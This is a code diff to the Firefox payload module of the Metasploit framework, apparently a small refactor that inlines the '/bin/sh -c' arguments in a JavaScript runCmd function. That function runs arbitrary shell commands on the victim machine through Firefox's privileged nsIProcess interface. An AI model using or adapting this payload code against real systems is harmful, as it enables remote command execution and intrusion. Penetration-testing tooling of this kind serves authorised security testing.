@@ -35,8 +35,6 @@ module Msf::Payload::Firefox
         .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
       var jscript = (#{JSON.unparse({:src => jscript_launcher})}).src;
       var runCmd = function(cmd) {
-        var shPath = "/bin/sh";
-        var shFlag = "-c";
         var shEsc = "\\\\$&";
         var windows = (ua.indexOf("Windows")>-1);
 
@@ -73,10 +71,9 @@ module Msf::Payload::Firefox
         if (windows) {
           var shell = "cmd /c "+cmd;
           shell = "cmd /c "+shell.replace(/\\W/g, shEsc)+" >"+stdout.path+" 2>"+stderr.path;
-        }
-        else {
-          var shell = [shPath, shFlag, cmd.replace(/\\W/g, shEsc)].join(" ");
-          shell = shPath + " " + shFlag + " " + (shell + " >"+stdout.path+" 2>"+stderr.path).replace(/\\W/g, shEsc);
+        } else {
+          var shell = ["/bin/sh", "-c", cmd.replace(/\\W/g, shEsc)].join(" ");
+          shell = "/bin/sh -c "+(shell + " >"+stdout.path+" 2>"+stderr.path).replace(/\\W/g, shEsc);
         }
         var process = Components.classes["@mozilla.org/process/util;1"]
           .createInstance(Components.interfaces.nsIProcess);
@@ -89,9 +86,9 @@ module Msf::Payload::Firefox
           var args = [jscriptFile.path, shell];
           process.run(true, args, args.length);
         } else {
-          sh.initWithPath(shPath);
+          sh.initWithPath("/bin/sh");
           process.init(sh);
-          process.run(true, [shFlag, shell], 2);
+          process.run(true, ["-c", shell], 2);
         }
 
         if (windows) {
